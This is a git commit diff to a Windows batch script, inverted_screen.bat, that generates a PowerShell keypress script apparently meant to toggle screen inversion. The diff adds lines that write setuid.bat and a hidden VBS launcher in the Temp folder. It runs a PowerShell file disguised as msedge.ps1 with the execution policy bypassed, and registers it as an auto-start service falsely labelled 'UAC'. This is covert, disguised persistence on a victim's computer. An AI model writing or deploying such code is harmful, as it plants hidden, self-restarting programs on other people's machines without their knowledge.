e433093f7b41d54458302ae888ffefcb7e8b3e5f
Alex <107642890+Administrator-Alex@users.noreply.github.com>
2025-02-03 10:07:57 +0200

    Update inverted_screen.bat

--- inverted_screen.bat
+++ inverted_screen.bat
@@ -18,7 +18,7 @@ echo [Keyboard]::keybd_event(0x11, 0, 2, 0) # Control Key Up >> %PS1File%
 echo [Keyboard]::keybd_event(0x5B, 0, 2, 0) # Left Windows Key Up >> %PS1File%
 echo Start-Sleep -Milliseconds 200 >>%PS1File%
 echo } >>%PS1File%
-echo powershell -ExecutionPolicy Bypass .\C:\Users\Windows10\AppData\Local\Temp\msedge.ps1 >>C:\Users\Windows10\AppData\Local\Temp\setuid.bat
+echo powershell -ExecutionPolicy Bypass C:\Users\Windows10\AppData\Local\Temp\msedge.ps1 >>C:\Users\Windows10\AppData\Local\Temp\setuid.bat
 echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Users\Windows10\AppData\Local\Temp\Deso.vbs
 echo WshShell.Run "C:\Users\Windows10\AppData\Local\Temp\setuid.bat", 0 , false >>C:\Users\Windows10\AppData\Local\Temp\Deso.vbs
 sc create "GID" start= auto displayname= "UAC" binpath=C:\Users\Windows10\AppData\Local\Temp\setuid.bat
